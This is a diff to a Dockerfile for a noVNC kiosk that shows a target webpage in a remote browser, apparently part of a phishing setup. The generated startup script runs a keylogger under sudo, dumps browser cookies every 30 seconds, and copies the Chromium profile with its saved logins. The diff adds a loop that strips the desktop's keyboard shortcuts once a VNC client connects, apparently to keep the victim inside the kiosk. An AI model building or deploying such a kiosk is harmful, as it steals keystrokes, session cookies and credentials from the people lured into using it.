@@ -27,7 +27,7 @@ RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd
     sudo apk del git
 
 RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
-    echo 'mkdir /home/user/noVNC/$FOLDER; mv /home/user/noVNC/* /home/user/noVNC/$FOLDER/; mv /home/user/noVNC/$FOLDER/utils /home/user/noVNC/; mv /home/user/noVNC/$FOLDER/*.html /home/user/noVNC/' > /home/user/kiosk.sh && \
+    echo 'mkdir /home/user/noVNC/$FOLDER && cp -r /home/user/noVNC/* /home/user/noVNC/$FOLDER/' > /home/user/kiosk.sh && \
     echo 'TITLE=$(curl -sk $WEBPAGE | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")' >> /home/user/kiosk.sh && \
     echo 'sed -i "124d" /home/user/noVNC/vnc_lite.html &&  sed  "131 i let path=\"$FOLDER/websockify\"" /home/user/noVNC/vnc_lite.html > /home/user/noVNC/index.html ' >> /home/user/kiosk.sh && \
     echo 'echo $TITLE > title.txt && sed -i "4s/.*/$(cat title.txt)/g" noVNC/index.html' >> /home/user/kiosk.sh && \
@@ -38,6 +38,7 @@ RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
     chmod +x /home/user/kiosk.sh
 
 RUN echo '/bin/bash -c /home/user/kiosk.sh &' > /home/user/startVNC.sh && \
+    echo 'nohup /bin/bash -c "while true; do if netstat | grep 5900 | grep ESTABLISHED ; then xfconf-query -c xfce4-keyboard-shortcuts -p /commands -r -R; break; fi; done" &' >> /home/user/startVNC.sh && \
     echo 'nohup /bin/bash -c "sudo python3 /home/user/keylogger.py &"' >> /home/user/startVNC.sh && \
     echo 'nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \
     echo 'nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \
